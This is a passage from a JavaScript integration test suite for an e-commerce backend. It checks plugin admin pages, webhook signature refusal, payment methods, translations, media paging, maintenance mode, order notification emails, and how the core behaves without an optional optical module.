          ok('plugin data does NOT leak into the public change feed');
        } else fail('PLUGIN DATA IN PUBLIC FEED', JSON.stringify(feed)?.slice(0, 200));
      }

      // --- Capability 2: admin pages ---
      {
        const page = await fetch(`${BASE}/admin/plugin/test-platform/widgets`, {
          headers: { Cookie: sessionCookie }, redirect: 'manual',
        });
        const html = page.status === 200 ? await page.text() : '';
        if (page.status === 200 && html.includes('data-testid="plugin-admin-body"')) {
          ok('a plugin admin page renders inside the admin layout');
        } else fail('plugin admin page', `status=${page.status}`);
        if (html.includes('AstroBaaS')) ok('and it is wrapped in the real admin chrome');
        else fail('plugin admin page not wrapped', html.slice(0, 120));
        // The nav link appears for a role that may open it.
        if (html.includes('/admin/plugin/test-platform/widgets')) ok('the plugin screen appears in the sidebar');
        else fail('plugin nav missing', 'no link in rendered sidebar');

        // Its script is served same-origin under the CSP, never inline.
        if (!/<script[^>]*>\s*window\.__PLUGIN_ADMIN_RAN__/.test(html)) {
          ok('plugin admin JavaScript is NOT inlined (the CSP would drop it)');
        } else fail('plugin script inlined', 'inline script present');
        const js = await fetch(
          `${BASE}/plugin-admin.js?page=${encodeURIComponent('/admin/plugin/test-platform/widgets')}`,
          { headers: { Cookie: sessionCookie } },
        );
        const jsBody = await js.text();
        if (js.status === 200 && jsBody.includes('__PLUGIN_ADMIN_RAN__')) {
          ok('and it IS served from /plugin-admin.js');
        } else fail('plugin admin script', `status=${js.status}`);
        if ((js.headers.get('content-type') || '').includes('javascript')) {
          ok('served with a javascript content type');
        } else fail('plugin script content-type', js.headers.get('content-type'));

        // Anonymous must not be able to read a plugin admin script.
        const jsAnon = await fetch(
          `${BASE}/plugin-admin.js?page=${encodeURIComponent('/admin/plugin/test-platform/widgets')}`,
        );
        if (jsAnon.status === 404) ok('a plugin admin script is not readable anonymously');
        else fail('plugin script leaked', `status=${jsAnon.status}`);

        // A page that throws must not take the admin down.
        const brokenPage = await fetch(`${BASE}/admin/plugin/test-platform/broken`, {
          headers: { Cookie: sessionCookie }, redirect: 'manual',
        });
        if (brokenPage.status === 200) ok('a plugin admin page that THROWS still returns the admin shell');
        else fail('broken plugin page', `status=${brokenPage.status}`);

        // An unknown plugin page redirects rather than 500ing.
        const ghost = await fetch(`${BASE}/admin/plugin/test-platform/does-not-exist`, {
          headers: { Cookie: sessionCookie }, redirect: 'manual',
        });
        if (ghost.status === 302 || ghost.status === 301) ok('an unknown plugin admin page redirects to /admin');
        else fail('unknown plugin page', `status=${ghost.status}`);
      }

      // A refusal from an OUT-OF-REPO provider must be answered 401, not 500.
      //
      // The provider cannot throw the host's WebhookVerificationError — it
      // imports nothing from the host, which is the whole point of shipping as
      // a package. Before the host recognised the failure by class name, a
      // forged event landed in the generic error branch: still refused, still
      // not applied, but answered "our fault, please retry". Providers retry
      // non-2xx with backoff and eventually disable an endpoint, so a forgery
      // probe could take a shop's real webhook out — and each one logged a
      // stack trace.
      const forged = await fetch(`${BASE}/api/payments/webhook/test-gateway`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Test-Gateway-Signature': 'wrong' },
        body: JSON.stringify({ id: 'evt-forged', reference: 'nope' }),
      });
      if (forged.status === 401) ok("a plugin gateway's verification failure is answered 401, not 500");
      else fail('external provider verification failure', `expected 401, got ${forged.status}`);

      // And the same endpoint still WORKS when verification passes, or the
      // assertion above would also hold with the route simply broken.
      const accepted = await fetch(`${BASE}/api/payments/webhook/test-gateway`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Test-Gateway-Signature': 'valid-signature' },
        body: JSON.stringify({ id: 'evt-ok', reference: 'unknown-order' }),
      });
      if (accepted.status === 200) ok('a verified event from a plugin gateway is accepted');
      else fail('external provider verified event', `expected 200, got ${accepted.status}`);

      // A plugin-contributed MANUAL method — no credentials, no API, the buyer
      // told what to do. Greece's IRIS forced this: a shop registers with its
      // own bank and is paid to its phone number, and MANUAL_METHODS was a
      // hardcoded pair no plugin could extend.
      const pubPay = await (await fetch(`${BASE}/api/payments`)).json().catch(() => null);
      const rows2 = pubPay?.data ?? [];
      const manual = rows2.find((m) => m.id === 'test-manual');
      if (manual && manual.kind === 'manual') ok('a plugin can contribute a manual payment method');
      else fail('plugin manual method missing', JSON.stringify(rows2.map((m) => m.id)));

      // Instructions must reach an ANONYMOUS buyer. Until now a shop could
      // offer "bank transfer" and the buyer was told nothing about where to
      // send the money.
      if (manual?.instructions?.en?.includes('order number')) {
        ok('buyer instructions are served publicly, unauthenticated');
      } else fail('manual instructions missing', JSON.stringify(manual));

      // The id collision must be refused, not resolved by array order.
      const impostor = rows2.filter((m) => m.id === 'test-gateway');
      if (impostor.length === 1 && impostor[0].kind === 'provider') {
        ok('a manual method may NOT shadow a gateway id');
      } else fail('manual method shadowed a gateway', JSON.stringify(impostor));

      // And it must be accepted at checkout, or it is decoration.
      //
      // On its OWN product: buying the shared one moves stock that later
      // assertions measure, and a test that quietly changes state another test
      // depends on fails somewhere far from the line that caused it.
      const manualProduct = await (await fetch(`${BASE}/api/products`, {
        method: 'POST', headers: ch,
        body: JSON.stringify({ name: 'Manual-method probe', price_cents: 500, stock: 3, status: 'active' }),
      })).json().catch(() => null);
      const manualOrder = await fetch(`${BASE}/api/orders`, {
        method: 'POST', headers: ch,
        body: JSON.stringify({
          email: 'manual-buyer@example.com', payment_method: 'test-manual',
          items: [{ product_id: manualProduct?.data?.id, qty: 1 }],
        }),
      });
      const manualJson = await manualOrder.json().catch(() => null);
      if (manualOrder.status === 201) ok('a plugin manual method is accepted at checkout');
      else fail('plugin manual method refused', `status=${manualOrder.status}`);
      // A manual method takes no money, so the order must NOT look paid.
      if (manualJson?.data?.payment_status === undefined || manualJson?.data?.payment_status === 'unpaid') {
        ok('a manual method leaves the order unpaid until a human says otherwise');
      } else fail('manual order payment_status', String(manualJson?.data?.payment_status));

      // --- checkout refusals carry a translatable REASON ---

      //

      // The message stays English on purpose: translating it server-side would

      // mean threading a locale through the whole commerce layer to serve two

      // storefronts that already have i18n and would rather have a code.

      {

        const rp = await (await fetch(`${BASE}/api/products`, {

          method: 'POST', headers: ch,

          body: JSON.stringify({ name: 'Reason probe', price_cents: 500, stock: 50, status: 'active' }),

        })).json().catch(() => null);

        const rid = rp?.data?.id;


        const over = await fetch(`${BASE}/api/orders`, {

          method: 'POST', headers: ch,

          body: JSON.stringify({ email: 'b@example.com', items: [{ product_id: rid, qty: 99 }] }),

        });

        const ob = await over.json().catch(() => null);

        if (over.status === 400 && ob?.error?.reason === 'checkout.qty_over_limit') {

          ok('a quantity refusal carries a stable reason code');

        } else fail('checkout reason code', `status=${over.status} ${JSON.stringify(ob?.error)?.slice(0, 140)}`);

        if (typeof ob?.error?.params?.max === 'number') {

          ok('and the value a storefront needs to build its own sentence');

        } else fail('checkout reason params', JSON.stringify(ob?.error?.params));

        // The English message must still be there for clients that know no codes.

        if (typeof ob?.error?.message === 'string' && ob.error.message.length > 5) {

          ok('the English message survives as the fallback');

        } else fail('message dropped', JSON.stringify(ob?.error));

        // And `code` keeps its old meaning, so nothing existing breaks.

        if (ob?.error?.code === 'BAD_REQUEST') ok('the HTTP-class code is unchanged');

        else fail('code changed meaning', String(ob?.error?.code));


        const empty = await fetch(`${BASE}/api/orders`, {

          method: 'POST', headers: ch,

          body: JSON.stringify({ email: 'b@example.com', items: [] }),

        });

        const eb = await empty.json().catch(() => null);

        if (eb?.error?.reason === 'checkout.no_items' || empty.status === 422) {

          ok('an empty basket is refused with a reason or a validation error');

        } else fail('empty basket reason', `status=${empty.status} ${JSON.stringify(eb?.error)?.slice(0,120)}`);

      }


      // --- catalogue translations ---

      //

      // Two shops are live with 436 products. The rule that protects them is that

      // a request naming no locale gets what it always got, so these assertions

      // compare the two responses rather than merely checking the new one works.

      {

        const tp = await (await fetch(`${BASE}/api/products`, {

          method: 'POST', headers: ch,

          body: JSON.stringify({

            name: 'Frame X', price_cents: 8900, stock: 5, status: 'active',

            description: '<p>English copy</p>',

            i18n: {

              de: { name: 'Fassung X', description: '<p>Deutsche Beschreibung</p>' },

              el: { name: 'Σκελετός Χ' },

              fr: { name: 'should be dropped' },

              de2: { stock: 999 },

            },

          }),

        })).json().catch(() => null);

        const pid = tp?.data?.id;

        if (pid) ok('a product saves with translations attached');

        else fail('translated product not created', JSON.stringify(tp)?.slice(0, 160));


        if (pid) {

          const get = async (qs) => (await (await fetch(`${BASE}/api/products/${pid}${qs}`)).json().catch(() => null))?.data;


          const base = await get('');

          const de = await get('?locale=de');

          const el = await get('?locale=el');


          // THE compatibility assertion.

          if (base?.name === 'Frame X' && base?.i18n === undefined) {

            ok('no ?locale= returns the base text with no i18n key — storefronts unchanged');

          } else fail('base projection changed the payload', JSON.stringify(base)?.slice(0, 160));


          if (de?.name === 'Fassung X' && String(de?.description).includes('Deutsche')) {

            ok('?locale=de projects the German text into the scalar fields');

          } else fail('de projection', JSON.stringify(de)?.slice(0, 160));


          // The rule whose failure blanks a product name on a live shop.

          if (el?.name === 'Σκελετός Χ' && String(el?.description).includes('English copy')) {

            ok('a partly-translated locale falls back FIELD BY FIELD, never to empty');

          } else fail('el field-by-field fallback', JSON.stringify(el)?.slice(0, 160));


          if (de?.i18n === undefined && el?.i18n === undefined) {

            ok('the i18n sidecar is never sent to a storefront');

          } else fail('sidecar leaked', 'i18n present in a localised response');


          // Identity and money must never be translatable.

          if (de?.stock === base?.stock && de?.price_cents === base?.price_cents && de?.id === base?.id) {

            ok('stock, price and id are identical in every locale');

          } else fail('identity field differs by locale', `${de?.stock} vs ${base?.stock}`);


          // An unserved locale and a non-translatable field must have been dropped

          // on the way IN, not merely ignored on the way out.

          const raw = (await (await fetch(`${BASE}/api/products?all=true&limit=200`, { headers: ch }))

            .json().catch(() => null))?.data?.find((x) => x.id === pid);

          const fr = await get('?locale=fr');

          if (fr?.name === 'Frame X') ok('an unserved locale falls back to the base text');

          else fail('unserved locale', JSON.stringify(fr)?.slice(0, 120));

          if (raw && raw.stock === 5) ok('a translation cannot overwrite stock');

          else fail('translation reached a non-text field', JSON.stringify(raw)?.slice(0, 160));

        }

      }


      // --- media paging, search, and conditional uploads ---
      //
      // Reported from production: /api/media/get returned the WHOLE library (948
      // items there), the admin rendered both views from it, and one manager
      // opening the picker produced 33 HTTP 503s in a minute.
      {
        // Enough rows that a default page cannot contain them.
        const seeded = [];
        for (let i = 0; i < 8; i += 1) {
          const fd = new FormData();
          const png = Uint8Array.from(atob(
            'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=='
          ), (c) => c.charCodeAt(0));
          fd.append('file', new File([png], `paging-probe-${i}.png`, { type: 'image/png' }));
          const up = await fetch(`${BASE}/api/media/upload`, {
            method: 'POST',
            // Double-submit needs BOTH halves: the cookie and the header.
            headers: {
              Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
              'X-CSRF-Token': csrfToken,
            },
            body: fd,
          });
          if (up.status === 201 || up.status === 200) seeded.push(i);
          else if (i === 0) console.error('  seed upload ->', up.status, (await up.text()).slice(0, 200));
        }
        if (seeded.length >= 4) ok('media probes uploaded for the paging tests');
        else fail('media seeding', `only ${seeded.length} uploaded`);
        const mediaGet = async (qs) => {
          const r = await fetch(`${BASE}/api/media/get${qs}`, { headers: ch });
          return { status: r.status, body: await r.json().catch(() => null) };
        };
        // Backwards compatibility: no parameters must behave exactly as before, or
        // the product picker silently receives a first page it cannot detect.
        const unpaged = await mediaGet('');
        if (unpaged.status === 200 && Array.isArray(unpaged.body?.data) && unpaged.body.data.length >= seeded.length) {
          ok('no paging parameters still returns the WHOLE library');
        } else fail('unpaged media response', JSON.stringify(unpaged.body)?.slice(0, 140));
        if (typeof unpaged.body?.meta?.total === 'number') ok('and reports a total');
        else fail('media total missing', JSON.stringify(unpaged.body?.meta));
        const page1 = await mediaGet('?limit=3&offset=0');
        if (page1.body?.data?.length === 3) ok('limit returns exactly that many');
        else fail('media limit', `got ${page1.body?.data?.length}`);
        if (page1.body?.meta?.has_more === true) ok('and says there is more');
        else fail('media has_more', JSON.stringify(page1.body?.meta));
        const page2 = await mediaGet('?limit=3&offset=3');
        const ids1 = (page1.body?.data ?? []).map((m) => m.id);
        const ids2 = (page2.body?.data ?? []).map((m) => m.id);
        if (ids2.length && ids1.every((id) => !ids2.includes(id))) {
          ok('offset returns a DIFFERENT page, never a repeat');
        } else fail('media offset', `${ids1.join()} vs ${ids2.join()}`);
        // Search must run on the SERVER, over the whole library.
        const found = await mediaGet('?q=paging-probe-2');
        if ((found.body?.data ?? []).length >= 1 && found.body.data.every((m) => String(m.original_name).includes('paging-probe-2'))) {
          ok('q= filters server-side on the recognisable name');
        } else fail('media search', JSON.stringify(found.body?.data)?.slice(0, 140));
        if (found.body?.meta?.total >= 1 && found.body.meta.total < (unpaged.body?.meta?.total ?? 1e9)) {
          ok('and the total reflects the search, not the library');
        } else fail('media search total', JSON.stringify(found.body?.meta));
        const none = await mediaGet('?q=zzz-nothing-matches-zzz');
        if ((none.body?.data ?? []).length === 0 && none.body?.meta?.total === 0) {
          ok('a search matching nothing returns nothing, with a zero total');
        } else fail('media empty search', JSON.stringify(none.body?.meta));
        // Staff-only, unchanged — this check was hard-won.
        const anonMedia = await fetch(`${BASE}/api/media/get?limit=3`);
        if (anonMedia.status === 401 || anonMedia.status === 403) ok('media paging is still staff-only');
        else fail('MEDIA LIBRARY EXPOSED', `status=${anonMedia.status}`);
        // --- conditional requests for the file itself ---
        const anyItem = (unpaged.body?.data ?? [])[0];
        if (anyItem?.url) {
          const first = await fetch(`${BASE}${anyItem.url}`);
          const etag = first.headers.get('etag');
          const lastMod = first.headers.get('last-modified');
          if (first.status === 200 && etag) ok('an upload is served with an ETag');
          else fail('upload ETag missing', `status=${first.status}`);
          if (lastMod) ok('and a Last-Modified');
          else fail('upload Last-Modified missing', String(lastMod));
          // The whole point: a revalidation must cost no body.
          const cond = await fetch(`${BASE}${anyItem.url}`, { headers: { 'If-None-Match': etag } });
          if (cond.status === 304) ok('If-None-Match on an unchanged upload returns 304');
          else fail('conditional upload request', `expected 304, got ${cond.status}`);
          const condBody = await cond.text();
          if (condBody.length === 0) ok('and sends no body at all');
          else fail('304 carried a body', `${condBody.length} bytes`);
          const condMod = await fetch(`${BASE}${anyItem.url}`, { headers: { 'If-Modified-Since': lastMod } });
          if (condMod.status === 304) ok('If-Modified-Since also returns 304');
          else fail('if-modified-since', `expected 304, got ${condMod.status}`);
          // A stale validator must still send the file.
          const stale = await fetch(`${BASE}${anyItem.url}`, { headers: { 'If-None-Match': 'W/"stale"' } });
          if (stale.status === 200) ok('a stale ETag still gets the file');
          else fail('stale etag', `status=${stale.status}`);
        } else fail('no uploaded media to test conditionally', 'none');
      }
      // --- the media picker's search depends on original_name ---

      //

      // The uploader RANDOMISES the stored name (a74bbfad551aabf7.webp), so a

      // picker that searches `filename` matches nothing a person would ever

      // type — which is how "there is no search" was reported on a live shop

      // even after a search box existed. `original_name` is the only field

      // that holds the name the operator recognises.

      {

        const mediaList = await (await fetch(`${BASE}/api/media/get`, { headers: ch }))

          .json().catch(() => null);

        const rows = Array.isArray(mediaList?.data) ? mediaList.data : [];

        if (rows.length === 0) {

          ok('media library is empty in this run — nothing to assert');

        } else {

          const withOriginal = rows.filter((m) => typeof m.original_name === 'string' && m.original_name);

          if (withOriginal.length === rows.length) {

            ok('every media record carries original_name, which the picker search needs');

          } else fail('media original_name missing', `${rows.length - withOriginal.length} of ${rows.length}`);

          // And it must differ from the stored name, or the whole point is moot.

          const randomised = withOriginal.some((m) => m.filename && m.filename !== m.original_name);

          if (randomised) ok('the stored filename is randomised, so search must use original_name');

          else fail('filename not randomised', JSON.stringify(withOriginal[0]).slice(0, 120));

        }

      }


      // --- maintenance mode, scheduled from the admin ---
      //
      // The env-var switch is the emergency one and cannot be toggled mid-run.
      // This covers the other source: the window an admin schedules, which is
      // the one that has to let STAFF through so the site can be checked before
      // reopening.
      {
        const setMaint = (payload) => fetch(`${BASE}/api/settings/update`, {
          method: 'POST', headers: ch, body: JSON.stringify(payload),
        });

        await setMaint({
          maintenance_enabled: true,
          maintenance_message: 'Back in ten minutes',
        });

        const anon = await fetch(`${BASE}/`, { redirect: 'manual' });
        if (anon.status === 503) ok('a scheduled window closes the public site');
        else fail('maintenance did not close the site', `status=${anon.status}`);

        // A 200 would tell a crawler this IS the content now.
        const retry = anon.headers.get('retry-after');
        if (retry && Number(retry) > 0) ok('and sends Retry-After, so crawlers come back');
        else fail('no Retry-After', String(retry));
        if (/no-store/.test(anon.headers.get('cache-control') ?? '')) {
          ok('and is never cached — a cached holding page outlives the window');
        } else fail('maintenance page cacheable', anon.headers.get('cache-control'));
        const anonBody = await anon.text();
        if (anonBody.includes('Back in ten minutes')) ok("the operator's own message is shown");
        else fail('maintenance message missing', anonBody.slice(0, 120));

        const anonApi = await fetch(`${BASE}/api/products`);
        const anonApiBody = await anonApi.json().catch(() => null);
        if (anonApi.status === 503 && anonApiBody?.error?.code === 'MAINTENANCE') {
          ok('API callers get a machine-readable 503, not HTML');
        } else fail('maintenance api shape', `status=${anonApi.status}`);

        // S3.5: a payment provider confirming a payment is not a visitor. Its
        // webhook reaches the handler — which answers this forgery 401 — rather
        // than a 503 that would leave a paid order pending until the retry.
        const hookDuring = await fetch(`${BASE}/api/payments/webhook/stripe`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Stripe-Signature': 't=1,v1=00' },
          body: JSON.stringify({ id: 'evt_during_maintenance', type: 'checkout.session.completed' }),
        });
        if (hookDuring.status !== 503) ok(`S3.5: payment webhooks are not held by a maintenance window (${hookDuring.status})`);
        else fail('S3.5 webhook held', 'a provider webhook got the maintenance 503');
        const startDuring = await fetch(`${BASE}/api/payments/start`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', Origin: 'https://frontend.example.com' },
          body: '{}',
        });
        if (startDuring.status === 503) ok('S3.5: ...while starting a new payment stays closed');
        else fail('S3.5 payment start open', `status=${startDuring.status}`);

        // Staff see the real site — the whole point of a PLANNED window.
        const staff = await fetch(`${BASE}/`, {
          headers: { Cookie: sessionCookie }, redirect: 'manual',
        });
        if (staff.status === 200) ok('staff still see the real site during a window');
        else fail('staff locked out by maintenance', `status=${staff.status}`);

        // And the way back in must never close.
        const adminReachable = await fetch(`${BASE}/admin`, {
          headers: { Cookie: sessionCookie }, redirect: 'manual',
        });
        if (adminReachable.status === 200) ok('the admin stays reachable, so it can be switched off');
        else fail('ADMIN LOCKED OUT', `status=${adminReachable.status}`);
        const health = await fetch(`${BASE}/healthz`);
        if (health.status === 200) ok('health checks stay green, so the host keeps the site in rotation');
        else fail('healthz held', `status=${health.status}`);

        // Reopen, and prove it actually reopened.
        await setMaint({ maintenance_enabled: false, maintenance_message: '' });
        const after = await fetch(`${BASE}/`, { redirect: 'manual' });
        if (after.status === 200) ok('turning it off reopens the site');
        else fail('site did not reopen', `status=${after.status}`);
      }

      // --- new-sale notification, end to end on the checkout path ---
      //
      // The unit tests cover the wording and every escaping rule. What only a
      // real checkout can show is that the notifier is WIRED — that placing an
      // order actually reaches the mail transport. The default transport logs
      // to the console, so the server's own output is the receipt.
      {
        const settingsSave = (payload) => fetch(`${BASE}/api/settings/update`, {
          method: 'POST', headers: ch, body: JSON.stringify(payload),
        });

        const npRes = await (await fetch(`${BASE}/api/products`, {
          method: 'POST', headers: ch,
          body: JSON.stringify({ name: 'Notify probe', price_cents: 2500, stock: 5, status: 'active' }),
        })).json().catch(() => null);
        const npId = npRes?.data?.id;

        // OFF: an order must produce no notification at all.
        await settingsSave({ sale_notify_enabled: false, sale_notify_recipients: '' });
        await fetch(`${BASE}/api/orders`, {
          method: 'POST', headers: ch,
          body: JSON.stringify({ email: 'quiet@example.com', items: [{ product_id: npId, qty: 1 }] }),
        });

        // ON.
        const saved = await settingsSave({
          sale_notify_enabled: true,
          sale_notify_recipients: 'owner@example.gr, junk, owner@example.gr, second@example.gr',
        });
        if (saved.status === 200) ok('new-sale notification settings save');
        else fail('sale notify settings', `status=${saved.status}`);

        const readBack = await (await fetch(`${BASE}/api/settings/get`, { headers: ch }))
          .json().catch(() => null);
        if (readBack?.data?.sale_notify_enabled === true) ok('the notification toggle persists');
        else fail('sale notify toggle', JSON.stringify(readBack?.data?.sale_notify_enabled));

        // The recipient list is a shop's internal contact list. It has no
        // `public_` prefix, so settings-visibility must deny it anonymously.
        const anon = await (await fetch(`${BASE}/api/settings/get`)).json().catch(() => null);
        if (anon?.data?.sale_notify_recipients === undefined) {
          ok('the notification recipient list is NOT world-readable');
        } else fail('recipients leaked publicly', String(anon?.data?.sale_notify_recipients));

        // Everything above is configuration. THIS is the assertion that the
        // feature exists: place an order and read what actually left the
        // building. The suite runs the webhook mail transport, so every
        // outbound message lands in emailReceiver.
        const mailBefore = emailReceiver.deliveries.length;
        const notifyOrder = await fetch(`${BASE}/api/orders`, {
          method: 'POST', headers: ch,
          body: JSON.stringify({
            email: 'notify-buyer@example.com',
            items: [{ product_id: npId, qty: 2 }],
          }),
        });
        if (notifyOrder.status === 201) ok('checkout still succeeds with notifications on');
        else fail('checkout with notifications', `status=${notifyOrder.status}`);
        const orderNumber = (await notifyOrder.json().catch(() => null))?.data?.number;

        // Fire-and-forget, so give it a moment to land.
        let mails = [];
        for (let i = 0; i < 40 && mails.length < 2; i += 1) {
          await new Promise((r) => setTimeout(r, 100));
          mails = emailReceiver.deliveries.slice(mailBefore)
            .map((d) => { try { return JSON.parse(d.body); } catch { return null; } })
            .filter((m) => m && String(m.subject ?? '').includes('new order'));
        }

        if (mails.length === 2) ok('a new sale emails every configured recipient');
        else fail('sale notification not sent', `got ${mails.length} mails`);

        // Junk in the list must be dropped, not mailed and not counted.
        const tos = mails.map((m) => m.to).sort();
        if (tos.join() === 'owner@example.gr,second@example.gr') {
          ok('the recipient list is de-duplicated and junk is dropped');
        } else fail('sale notification recipients', JSON.stringify(tos));

        // One `to:` per message, or the shop publishes its own contact list.
        if (mails.every((m) => !String(m.to).includes(','))) {
          ok('each recipient is mailed separately, not in one to: header');
        } else fail('recipients batched into one header', JSON.stringify(tos));

        const body = mails[0] ?? {};
        if (String(body.subject).includes(orderNumber) && String(body.subject).includes('€50.00')) {
          ok('the subject carries the order number and the total');
        } else fail('sale notification subject', String(body.subject));
        // The line that decides whether the owner ships: this order is unpaid.
        if (/NOT YET PAID/.test(String(body.subject)) && /not marked paid/i.test(String(body.text))) {
          ok('an unpaid order is flagged as unpaid, in the subject and the body');
        } else fail('paid-state missing from notification', String(body.subject));

        // And the earlier order, placed while the setting was OFF, produced
        // nothing — otherwise this whole block would pass with the toggle inert.
        const strays = emailReceiver.deliveries
          .slice(0, mailBefore)
          .map((d) => { try { return JSON.parse(d.body); } catch { return null; } })
          .filter((m) => m && String(m.subject ?? '').includes('new order'));
        if (strays.length === 0) ok('no notification is sent while the setting is off');
        else fail('notified while disabled', JSON.stringify(strays.map((m) => m.subject)));

        // --- the CUSTOMER's confirmation actually LEAVES the building (C-34) ---
        //
        // The block above proves the SHOP is told. Nothing proved the BUYER is,
        // and that is the half the shop's money depends on: on a bank-transfer
        // order the confirmation carries the IBAN and the reference, so a
        // confirmation that never arrives is an order that can never be paid.
        // C-34 has been ✅ on the roadmap without this assertion existing.
        //
        // The order above already went to notify-buyer@example.com with the
        // confirmation defaulting ON, so the message is already in the
        // receiver — only the assertion was missing.
        {
          const confirmations = emailReceiver.deliveries.slice(mailBefore)
            .map((d) => { try { return JSON.parse(d.body); } catch { return null; } })
            .filter((m) => m && String(m.to ?? '') === 'notify-buyer@example.com');

          if (confirmations.length === 1) ok('the BUYER is emailed their order confirmation');
          else fail('no customer confirmation delivered', `got ${confirmations.length} to the buyer`);

          const conf = confirmations[0] ?? {};
          if (String(conf.subject ?? '').includes(orderNumber)) {
            ok('...carrying the order number in the subject');
          } else fail('confirmation subject', String(conf.subject));
          if (String(conf.text ?? '').includes('Thank you for your order')) {
            ok('...and the itemised body');
          } else fail('confirmation body', String(conf.text ?? '').slice(0, 120));

          // The receipt link (C-39) must be reachable from the mail the buyer keeps.
          if (String(conf.text ?? '').includes('/receipt?token=')) {
            ok('...and a working receipt link');
          } else fail('no receipt link in the confirmation', String(conf.text ?? '').slice(0, 200));

          // Now the bank details. Written through the settings API exactly as an
          // operator would, then a SECOND order, because the instructions are
          // resolved when the mail is built.
          const IBAN = 'GR16 0110 1250 0000 0001 2300 695';
          const wrote = await settingsSave({ payment_instructions_bank_transfer: `Alpha Bank\nIBAN: ${IBAN}` });
          if (wrote.status === 200) ok('bank-transfer instructions save');
          else fail('instructions save', `status=${wrote.status}`);

          const beforeBank = emailReceiver.deliveries.length;
          const bankOrder = await fetch(`${BASE}/api/orders`, {
            method: 'POST', headers: ch,
            body: JSON.stringify({
              email: 'bank-buyer@example.com',
              payment_method: 'bank-transfer',
              items: [{ product_id: npId, qty: 1 }],
            }),
          });
          const bankNumber = (await bankOrder.json().catch(() => null))?.data?.number;

          let bankMail = null;
          for (let i = 0; i < 40 && !bankMail; i += 1) {
            await new Promise((r) => setTimeout(r, 100));
            bankMail = emailReceiver.deliveries.slice(beforeBank)
              .map((d) => { try { return JSON.parse(d.body); } catch { return null; } })
              .find((m) => m && String(m.to ?? '') === 'bank-buyer@example.com') ?? null;
          }

          if (bankMail) ok('a bank-transfer buyer is emailed too');
          else fail('no bank-transfer confirmation', 'nothing addressed to bank-buyer@example.com');
          // THE assertion: without these two the order cannot be paid.
          if (bankMail && String(bankMail.text ?? '').includes(IBAN)) {
            ok('...carrying the IBAN the operator typed');
          } else fail('IBAN missing from the confirmation', String(bankMail?.text ?? '').slice(0, 240));
          if (bankMail && bankNumber && String(bankMail.text ?? '').includes(`Reference: ${bankNumber}`)) {
            ok('...and the payment reference, so the money can be matched');
          } else fail('payment reference missing', String(bankMail?.text ?? '').slice(0, 240));
        }
      }

      // validateEnv: a credential that is present and cannot work must DISABLE
      // the provider. Reported by name and fault, never by value.
      const diag = await (await fetch(`${BASE}/api/payments`, { headers: ch })).json().catch(() => null);
      const gwRow = (diag?.meta?.providers ?? []).find((p) => p.id === 'test-gateway');
      if (gwRow && Array.isArray(gwRow.problems) && gwRow.problems.length === 0 && gwRow.enabled === true) {
        ok('staff diagnostics report a usable plugin gateway as enabled');
      } else fail('provider diagnostics', JSON.stringify(gwRow));
      if (!JSON.stringify(diag).includes(process.env.TEST_GATEWAY_KEY ?? '\u0000')) {
        ok('provider diagnostics never carry a credential value');
      } else fail('credential leaked into diagnostics', 'TEST_GATEWAY_KEY appeared in /api/payments');
    }

    // --- the CORE without the optical vertical ---
        //
        // Prescriptions, frame geometry and fit now live in @astrobaas/optical,
        // a separate PRIVATE package. It is not installed here, and that is the
        // point: this suite covers the open-source core, so what it must prove
        // is the DEGRADATION CONTRACT — an install without the vertical behaves
        // exactly like one that never had it.
        //
        // The optical rules themselves are tested in that package (151
        // assertions). Testing them here would need the private module in
        // public CI, which is the coupling the extraction removed.
        {
          // Not bundled: nothing registers `optical` unless ASTROBAAS_PLUGINS
          // names it, so even an admin cannot switch on what is not there.
          const toggle = await fetch(`${BASE}/api/plugins/toggle`, {
            method: 'POST', headers: ch, body: JSON.stringify({ id: 'optical', active: true }),
          });
          if (toggle.status === 404) ok('the optical module is not bundled with the core');
          else fail('optical still bundled', `toggle returned ${toggle.status}, expected 404`);

          // Both optical schema routes exist in core but answer from a plugin
          // hook. With no vertical installed the answer is null, and 404 is the
          // honest reply — publishing a clinical schema nothing enforces would
          // advertise a capability that does not exist.
          for (const [path, label] of [
            ['/api/commerce/prescription-schema', 'prescription'],
            ['/api/commerce/frame-schema', 'frame'],
          ]) {
            const r = await fetch(`${BASE}${path}`);
            if (r.status === 404) ok(`${label} schema 404s without the vertical`);
            else fail(`${label} schema leak`, `status=${r.status}, expected 404`);
          }

          // `requires_prescription` becomes INERT DATA. It still round-trips
          // through storage — an operator's catalogue is not rewritten because
          // a module is absent — but nothing acts on it.
          const rxName = `Inert Rx ${Date.now().toString(36)}`;
          const rxRes = await mkProduct({
            name: rxName, price_cents: 4900, stock: 20, status: 'active',
            requires_prescription: true, prescription_type: 'spectacles',
          });
          const rxId = (await rxRes.json().catch(() => null))?.data?.id;
          const back = (await (await fetch(`${BASE}/api/products/${rxId}`, { headers: ch })).json().catch(() => null))?.data;
          if (back?.requires_prescription === true) ok('requires_prescription still round-trips as stored data');
          else fail('flag lost', JSON.stringify({ rp: back?.requires_prescription }));

          // …and the sale goes through, because no vertical is there to refuse
          // it. This is the contract, not a bug: a general shop that happens to
          // have the flag set must not be blocked by rules it never bought.
          const bare = await fetch(`${BASE}/api/orders`, {
            method: 'POST', headers: ch,
            body: JSON.stringify({ email: 'inert@example.com', items: [{ product_id: rxId, qty: 1 }] }),
          });
          if (bare.status === 201) ok('without the vertical, an Rx-flagged product simply sells');
          else fail('core refused without a vertical', `status=${bare.status}, expected 201`);

          // A prescription sent by an old storefront must not 500 the checkout.
          // Nothing understands it, so nothing may crash on it.
          const stray = await fetch(`${BASE}/api/orders`, {
            method: 'POST', headers: ch,
            body: JSON.stringify({
              email: 'stray@example.com',
              items: [{ product_id: rxId, qty: 1, prescription: { od: { sph: '-2.00' }, os: { sph: '-2.00' } } }],
            }),
          });
          if (stray.status < 500) ok('an unrecognised prescription payload does not crash checkout');
          else fail('crash on unknown payload', `status=${stray.status}`);
        }

        // Storefronts need the cap to render a matching qty selector.
        const meta = (await (await fetch(`${BASE}/api/products`)).json().catch(() => null))?.meta;
        if (meta?.max_qty_per_product === 3 && meta?.max_items_per_order === 50) ok('catalogue meta advertises the order limits');
